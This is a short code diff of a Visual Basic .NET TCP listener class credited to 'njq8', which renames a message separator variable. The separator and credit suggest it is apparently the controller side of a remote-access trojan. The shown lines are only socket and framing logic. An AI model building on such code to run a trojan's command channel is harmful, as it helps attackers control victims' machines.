@@ -1,7 +1,7 @@
 ﻿Public Class Listner
     'credit njq8
     Public S As Net.Sockets.TcpListener
-    Public spl As String = "|'N'|"
+    Public KEY As String = "|'N'|"
     Public Event Data(ByVal u As USER, ByVal b As Byte())
     Public Event Disconnected(ByVal u As USER)
     Public Event Connected(ByVal u As USER)
@@ -37,8 +37,8 @@
                 u.MEM.Write(u.B, 0, i)
 re:
                 Dim s As String = BS(u.MEM.ToArray)
-                If s.Contains(spl) Then
-                    Dim A As Array = fx(u.MEM.ToArray, spl)
+                If s.Contains(KEY) Then
+                    Dim A As Array = fx(u.MEM.ToArray, KEY)
                     RaiseEvent Data(u, A(0))
                     u.MEM.Dispose()
                     u.MEM = New IO.MemoryStream
@@ -67,7 +67,7 @@ disconnect:
         Try
             SyncLock u.C
                 u.C.Send(b, 0, b.Length, Net.Sockets.SocketFlags.None)
-                u.C.Send(SB(spl), 0, spl.Length, Net.Sockets.SocketFlags.None)
+                u.C.Send(SB(KEY), 0, KEY.Length, Net.Sockets.SocketFlags.None)
                 Return True
             End SyncLock
         Catch ex As Exception
